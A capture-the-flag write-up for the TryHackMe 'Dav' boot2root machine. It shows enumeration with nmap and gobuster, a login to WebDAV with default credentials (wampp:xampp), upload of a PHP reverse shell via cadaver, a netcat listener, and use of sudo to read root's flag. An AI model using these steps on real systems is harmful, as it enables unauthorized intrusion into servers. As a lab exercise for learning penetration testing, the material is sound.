# [Dav](https://tryhackme.com/room/bsidesgtdav)

## boot2root machine for FIT and bsides guatemala CTF

# Dav

## Read user.txt and root.txt

### user.txt

1. Starting by nmap and gobuster enumeration we find there is only one open port. We also discover a `webdav` directory

```Bash
nmap -p- <IP>
```

- `-p-`: Scans all 65535 TCP ports

```Bash
gobuster dir -u http://<IP>:80/ -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

![SCREEN01](https://github.com/user-attachments/assets/d0ef2285-2fcc-4368-9dfd-7d265dc6c377)
![SCREEN02](https://github.com/user-attachments/assets/f6e3b5ec-0580-42f6-adbc-eb2f0c06079e)

2. It is always good to check default credentials. On this [blogpost](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) I have found one - `wampp:xampp`

3. Now that we know credentials, prepare [reverse shell payload](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), and upload it into /webdav with `cadaver`

```Bash
cadaver http://<IP>/webdav/
put shell.php
```

4. Set up a netcat listener and trigger the shell by navigating to the uploaded PHP file in `/webdav`

```Bash
nc -lvnp 4444
```

```Bash
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/merlin/user.txt
```

![SCREEN03](https://github.com/user-attachments/assets/db258f89-28cc-444b-9a8f-2001164c88bf)
![SCREEN04](https://github.com/user-attachments/assets/d8ced6fd-e4c6-4c5e-95a0-fc994c77b9a6)

### root.txt

1. Let's check what commands we can run with sudo

```Bash
sudo -l
sudo cat /root/root.txt
```

![SCREEN05](https://github.com/user-attachments/assets/35371c5c-3607-412d-8dd7-8ed7c8b83759)
